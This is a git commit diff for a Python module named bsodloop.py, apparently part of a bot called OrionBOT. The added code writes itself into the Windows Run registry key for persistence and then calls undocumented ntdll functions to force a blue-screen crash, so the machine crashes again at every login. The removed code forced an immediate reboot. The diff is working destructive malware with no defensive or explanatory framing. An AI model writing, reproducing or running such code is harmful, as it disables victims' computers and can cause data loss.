0571bbca2fe418ebb2230c7ea5b50c606fc51bfc
plasma <primexcelestial@protonmail.com>
2025-08-26 23:52:20 +0200

    Update bsodloop.py

--- OrionBOT/funcs/bsodloop.py
+++ OrionBOT/funcs/bsodloop.py
@@ -1,20 +1,32 @@
+import os
+import sys
+import ctypes
+import winreg
 def run():
-    import os
-    import ctypes
-    import sys
-    import subprocess
-    
-    def is_admin():
-        try:
-            return ctypes.windll.shell32.IsUserAnAdmin()
-        except:
-            return False
-    
-    if not is_admin():
-        sys.exit(1)
-    
-    target_path = r"C:\Windows\System32\config\OSDATA"
-    
-    try:
-        os.makedirs(target_path, exist_ok=True)    
-        subprocess.run(["shutdown", "/r", "/f", "/t", "0"])
+    def trigger_bsod():
+        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_int()))
+        ctypes.windll.ntdll.NtRaiseHardError(
+            ctypes.c_ulong(0xC000007B),
+            0,
+            None,
+            None,
+            6,
+            ctypes.byref(ctypes.c_uint())
+        )
+
+    def add_to_startup():
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0,
+            winreg.KEY_SET_VALUE
+        )
+        script_path = os.path.abspath(sys.argv[0])
+        winreg.SetValueEx(key, "BSODLoop", 0, winreg.REG_SZ, f'pythonw "{script_path}"')
+        winreg.CloseKey(key)
+
+    if __name__ == "__main__":
+        if os.name != "nt":
+            sys.exit(0)
+        add_to_startup()
+        trigger_bsod()
